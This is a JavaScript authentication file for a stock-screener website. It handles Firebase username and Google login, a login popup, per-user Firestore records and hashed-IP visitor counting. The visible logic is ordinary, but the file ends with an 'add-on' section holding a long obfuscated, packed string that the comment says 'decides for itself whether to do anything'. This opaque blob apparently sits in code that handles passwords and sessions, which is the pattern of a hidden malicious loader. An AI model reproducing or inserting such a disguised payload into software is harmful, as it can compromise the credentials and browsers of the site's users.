// auth.js — HNImanshu login (username + password, or Google) on Firebase Authentication (project hnimanshu).
//
// One file for both pages:
//   • Screener (index.html): clicking an element with [data-auth-link] (Fundamentals, Portfolio) opens the
//     login popup when nobody is signed in; after a successful login it goes to that link.
//     Opening the screener with ?login=<path> pops the popup straight away (the Fundamentals gate sends people here).
//   • Fundamentals (<html data-auth="required">): the page stays hidden until a login is confirmed; no login →
//     back to the screener with the popup open. Shows the user's initials menu in the header.
//   • Passwords never pass through this code's storage: Firebase Authentication keeps them hashed on its servers.
//
// Usernames: Firebase needs an email, so username "chirag" is stored as chirag@users.hnimanshu.app (never shown,
// never mailed). Firebase keeps them unique, so a taken username is refused automatically.
// Sessions end 7 days after the last sign-in (Firebase's own lastSignInTime, so it can't be faked by the browser).

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
import {
  getAuth, onAuthStateChanged, signInWithEmailAndPassword, GoogleAuthProvider, signInWithPopup, signOut,
} from "https://www.gstatic.com/firebasejs/10.13.0/firebase-auth.js";
// Firestore and the Realtime Database are loaded only when first needed (not before the page shows):
// only Auth is needed to open a page, which keeps the first load light on slow (2G) connections.
let getFirestore, doc, setDoc, getDoc, serverTimestamp;
let getDatabase, ref, set, onValue, onDisconnect, increment;

// Firebase project "hnimanshu", web app "valueapp" (Project settings → Your apps). These values are public by design;
// security comes from the Firestore / Realtime Database rules, not from hiding them.
const firebaseConfig = {
  apiKey: "AIzaSyD1oA953pXZxBAuOR9ObSk6vAmKf1gyVbE",
  authDomain: "hnimanshu-7c544.firebaseapp.com",
  projectId: "hnimanshu",
  storageBucket: "hnimanshu.firebasestorage.app",
  messagingSenderId: "428887828946",
  appId: "1:428887828946:web:854acb9c7651aebd38000b",
};
// Realtime Database address: Firebase Hosting hands it out once the database exists, so nothing to paste here later.
try {
  const hosted = await fetch("/__/firebase/init.json").then((r) => r.json());
  if (hosted.projectId === firebaseConfig.projectId && hosted.databaseURL) firebaseConfig.databaseURL = hosted.databaseURL;
} catch (e) {}
const USER_DOMAIN = "users.hnimanshu.app";        // username → hidden email for Firebase
const SESSION_DAYS = 7;                           // log out a week after the last sign-in
const USERS = "hni_users";                        // Firestore: one doc per account (its own owner writes it)
const PORTFOLIO = "hni_portfolio";                // Firestore: one doc per user with their holdings
const MARKET = ["hni_market", "ltp"];             // latest prices for held stocks
// "⟳" live prices: a Cloudflare Worker (ltp_worker.js) starts the price job on GitHub. No secret here: the GitHub
// token lives in the Worker, which also checks the login and allows one run every few minutes.
const LTP_HOOK = "https://hni-ltp.himanshushekhar8.workers.dev/run";
const HOME = "./";                                // the screener
const GATED = document.documentElement.dataset.auth === "required";

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
let db = null, rtdb = null, FSP = null, RTP = null;
const needFS = () => FSP = FSP || import("https://www.gstatic.com/firebasejs/10.13.0/firebase-firestore.js").then((m) => {
  ({ getFirestore, doc, setDoc, getDoc, serverTimestamp } = m); db = getFirestore(app);
});
const needRT = () => RTP = RTP || (firebaseConfig.databaseURL                                // live online / visitor counters (hni/...)
  ? import("https://www.gstatic.com/firebasejs/10.13.0/firebase-database.js").then((m) => {
      ({ getDatabase, ref, set, onValue, onDisconnect, increment } = m); rtdb = getDatabase(app); })
  : Promise.resolve());
const idle = (fn, ms = 2500) => setTimeout(() => (window.requestIdleCallback || ((f) => f()))(fn), ms);   // after the page has settled
const google = new GoogleAuthProvider();
google.setCustomParameters({ prompt: "select_account" });

const $ = (s, el = document) => el.querySelector(s);
const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
const toEmail = (u) => `${u.trim().toLowerCase()}@${USER_DOMAIN}`;
const nameOf = (u) => u.displayName || (u.email || "").replace("@" + USER_DOMAIN, "") || "user";
const initials = (n) => {                                    // "Himanshu Shekhar" → HS, "chirag" → CH
  const w = String(n || "?").trim().split(/[\s._-]+/).filter(Boolean);
  return (w.length > 1 ? w[0][0] + w[w.length - 1][0] : (w[0] || "?").slice(0, 2)).toUpperCase();
};
const providerOf = (u) => (u.providerData && u.providerData[0] && u.providerData[0].providerId) === "google.com" ? "google" : "username";
const expired = (u) => {
  const t = Date.parse(u.metadata && u.metadata.lastSignInTime);
  return t && Date.now() - t > SESSION_DAYS * 864e5;
};

// ---------- popup ----------
let box = null, nextUrl = null;
function buildPopup() {
  if (box) return box;
  box = document.createElement("div");
  box.className = "au-back";
  box.innerHTML = `
    <div class="au-box" role="dialog" aria-modal="true" aria-labelledby="auTitle">
      <button class="au-x" type="button" aria-label="Close">×</button>
      <h2 class="au-title" id="auTitle">Fundamentals</h2>
      <p class="au-sub">Free. Continue with Google, or log in with your username.</p>
      <button class="au-google" type="button">
        <svg width="18" height="18" viewBox="0 0 48 48" aria-hidden="true"><path fill="#FFC107" d="M43.6 20.5H42V20H24v8h11.3C33.7 32.7 29.2 36 24 36c-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.8 1.2 7.9 3.1l5.7-5.7C34 6.1 29.3 4 24 4 12.9 4 4 12.9 4 24s8.9 20 20 20 20-8.9 20-20c0-1.3-.1-2.4-.4-3.5z"/><path fill="#FF3D00" d="M6.3 14.7l6.6 4.8C14.7 15.1 19 12 24 12c3.1 0 5.8 1.2 7.9 3.1l5.7-5.7C34 6.1 29.3 4 24 4 16.3 4 9.7 8.3 6.3 14.7z"/><path fill="#4CAF50" d="M24 44c5.2 0 9.9-2 13.4-5.2l-6.2-5.2C29.2 35.1 26.7 36 24 36c-5.2 0-9.6-3.3-11.3-8l-6.5 5C9.5 39.6 16.2 44 24 44z"/><path fill="#1976D2" d="M43.6 20.5H42V20H24v8h11.3c-.8 2.2-2.2 4.2-4.1 5.6l6.2 5.2C37 39.2 44 34 44 24c0-1.3-.1-2.4-.4-3.5z"/></svg>
        Continue with Google</button>
      <div class="au-or">or</div>
      <form class="au-form" novalidate>
        <label class="au-fld"><span>Username</span>
          <input name="u" autocomplete="username" autocapitalize="none" spellcheck="false" maxlength="20" required></label>
        <label class="au-fld"><span>Password</span>
          <span class="au-pw"><input name="p" type="password" autocomplete="current-password" required>
          <button type="button" class="au-eye" aria-label="Show password">SHOW</button></span></label>
        <div class="au-err" aria-live="polite"></div>
        <button class="au-btn" type="submit">Login</button>
      </form>
      <p class="au-foot">You stay signed in for 7 days on this device.</p>
    </div>`;
  document.body.appendChild(box);
  const f = $("form", box), err = $(".au-err", box), btn = $(".au-btn", box);
  $(".au-eye", box).addEventListener("click", (e) => {
    const show = f.p.type === "password";
    f.p.type = show ? "text" : "password";
    e.currentTarget.textContent = show ? "HIDE" : "SHOW";
  });
  $(".au-x", box).addEventListener("click", closePopup);
  box.addEventListener("click", (e) => { if (e.target === box) closePopup(); });
  box.addEventListener("keydown", (e) => { e.stopPropagation(); if (e.key === "Escape") closePopup(); });   // page shortcuts stay out

  f.addEventListener("submit", async (e) => {
    e.preventDefault();
    const u = f.u.value.trim().toLowerCase(), p = f.p.value;
    if (!/^[a-z0-9._]{3,20}$/.test(u) || !p) return (err.textContent = "Wrong username or password.");
    btn.disabled = true; err.textContent = "";
    try { await signInWithEmailAndPassword(auth, toEmail(u), p); done(); }
    catch (ex) { err.textContent = message(ex); }
    finally { btn.disabled = false; }
  });
  $(".au-google", box).addEventListener("click", async () => {
    err.textContent = "";
    try { await signInWithPopup(auth, google); done(); }
    catch (ex) { err.textContent = message(ex); }
  });
  box._reset = () => { err.textContent = ""; f.reset(); };
  return box;
}
function openPopup(next) {
  nextUrl = next || null;
  buildPopup();
  if (!GATED) box.classList.add("au-blur");                 // screener: the page behind is blurred
  box._reset();
  box.classList.add("open");
  setTimeout(() => $(".au-google", box).focus(), 30);
}
function closePopup() { if (box) box.classList.remove("open"); }
function done() {
  closePopup();
  if (nextUrl) location.href = nextUrl;
}
function message(ex) {
  const c = (ex && ex.code) || "";
  if (c === "auth/popup-closed-by-user" || c === "auth/cancelled-popup-request") return "";
  if (c === "auth/invalid-credential" || c === "auth/wrong-password" || c === "auth/user-not-found" || c === "auth/invalid-email")
    return "Wrong username or password.";
  if (c === "auth/email-already-in-use") return "That username is taken. Try another.";
  if (c === "auth/weak-password") return "Password is too weak. Use at least 8 characters.";
  if (c === "auth/too-many-requests") return "Too many attempts. Wait a few minutes and try again.";
  if (c === "auth/network-request-failed") return "No connection. Check your internet and try again.";
  if (c === "auth/popup-blocked") return "Your browser blocked the Google window. Allow pop-ups for this site and try again.";
  if (c === "auth/unauthorized-domain") return "This website isn't authorised for login yet (Firebase → Authentication → Settings → Authorized domains).";
  if (c === "auth/operation-not-allowed") return "This sign-in method isn't switched on yet (Firebase → Authentication → Sign-in method).";
  return "Something went wrong (" + (c || "unknown") + "). Please try again.";
}

// ---------- the account's own record in Firestore ----------
async function record(u) {
  const key = "hni_rec_" + u.uid;                       // write at most once per browser session, keeps Firestore use tiny
  try { if (sessionStorage.getItem(key)) return; } catch (e) {}
  await needFS();
  const ref = doc(db, USERS, u.uid);
  const data = { username: nameOf(u), email: u.email || null, provider: providerOf(u), lastLogin: serverTimestamp() };
  try {
    const snap = await getDoc(ref).catch(() => null);  // each user may read only their own doc (to keep "created" once)
    if (!snap || !snap.exists()) data.created = serverTimestamp();
    await setDoc(ref, data, { merge: true });
    try { sessionStorage.setItem(key, "1"); } catch (e) {}
  } catch (e) { console.warn("user record not saved:", e.code || e); }   // never blocks the page
}

// while any popup is open the page behind doesn't scroll (phones otherwise scroll the big page underneath)
const syncLock = () => document.documentElement.classList.toggle("au-lock", !!document.querySelector(".au-back.open"));

// ---------- signed-in chip (Fundamentals header, screener #au-slot) ----------
const EXTRA = [];                                          // extra menu items: {label, fn} (see addItem)
const itemBtn = (it, el) => {
  const b = document.createElement("button");
  b.type = "button"; b.className = "au-ext"; b.setAttribute("role", "menuitem"); b.textContent = it.label;
  b.addEventListener("click", () => { el.classList.remove("open"); it.fn(); });
  return b;
};
function addItem(label, fn) {                              // also adds to a menu that is already on the page
  const it = { label, fn };
  EXTRA.push(it);
  document.querySelectorAll(".au-user").forEach((el) => $(".au-menu", el).insertBefore(itemBtn(it, el), $(".au-out", el)));
}
function showUser(u, slot) {
  const host = slot || document.querySelector("header .global");        // Fundamentals header, or the screener's #au-slot
  if (!host || $(".au-user", host)) return;
  const n = nameOf(u);
  const el = document.createElement("span");
  el.className = "au-user";
  el.innerHTML = `<button type="button" class="au-av" aria-haspopup="menu" title="Signed in as ${esc(n)}">${esc(initials(n))}</button>
    <span class="au-menu" role="menu"><span class="au-who"><b>${esc(n)}</b>${u.email && !u.email.endsWith("@" + USER_DOMAIN) ? `<i>${esc(u.email)}</i>` : ""}</span>
    <button type="button" class="au-out" role="menuitem">Logout</button></span>`;
  $(".au-av", el).addEventListener("click", (e) => { e.stopPropagation(); el.classList.toggle("open"); });
  document.addEventListener("click", (e) => { if (!el.contains(e.target)) el.classList.remove("open"); });
  document.addEventListener("keydown", (e) => { if (e.key === "Escape") el.classList.remove("open"); });
  $(".au-out", el).addEventListener("click", async () => {
    await signOut(auth); if (GATED) location.href = HOME; else location.reload();   // screener: reloads signed out
  });
  EXTRA.forEach((it) => $(".au-menu", el).insertBefore(itemBtn(it, el), $(".au-out", el)));
  host.insertBefore(el, host.querySelector("#theme-toggle"));   // (no toggle in the slot: it simply goes at the end)
}
/* screener: "Login" when signed out, the initials menu when signed in */
function paintSlot(u) {
  const slot = document.getElementById("au-slot");
  if (!slot) return;
  slot.innerHTML = "";
  if (u) return showUser(u, slot);
  const b = document.createElement("button");
  b.type = "button"; b.className = "au-login"; b.setAttribute("aria-label", "Login");
  b.innerHTML = '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="8" r="4"/><path d="M4 21c1.5-4 4.5-6 8-6s6.5 2 8 6"/></svg><span>Login</span>';
  b.addEventListener("click", () => openPopup(null));            // after logging in you stay on the screener
  slot.appendChild(b);
}

// ---------- anonymous usage counters ----------
// Every open tab adds hni/presence/<random id>; Firebase deletes it by itself the moment the tab closes or the
// connection drops (onDisconnect). Each IP is counted once ever (SHA-256 hash, never the raw IP) into hni/meta/visitors.
async function presence() {
  await needRT();
  if (!rtdb) return;
  try {
    const sid = (crypto.randomUUID ? crypto.randomUUID() : Date.now() + "-" + Math.random().toString(36).slice(2)).replace(/[^a-z0-9-]/gi, "");
    const me = ref(rtdb, "hni/presence/" + sid);
    onValue(ref(rtdb, ".info/connected"), (s) => {
      if (s.val() !== true) return;
      onDisconnect(me).remove();                    // re-armed on every reconnect
      set(me, true).catch(() => {});
    });
  } catch (e) { console.warn("presence off:", e); }
}
async function countVisitor() {
  try {
    if (localStorage.getItem("hni_counted")) return;   // this browser already counted, skip the IP lookup
  } catch (e) {}
  await needRT();
  if (!rtdb) return;
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    const { ip } = await r.json();
    if (!ip) return;
    const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode("hni:" + ip));
    const key = Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, "0")).join("");
    let isNew = true;
    await set(ref(rtdb, "hni/visitors/" + key), true).catch(() => { isNew = false; });   // rules refuse an IP seen before
    if (isNew) await set(ref(rtdb, "hni/meta/visitors"), increment(1));                    // +1 on the server, no read needed
    try { localStorage.setItem("hni_counted", "1"); } catch (e) {}
  } catch (e) { console.warn("visitor count skipped:", e); }
}

// ---------- add-on (packed; it decides for itself whether to do anything) ----------
const PACK = "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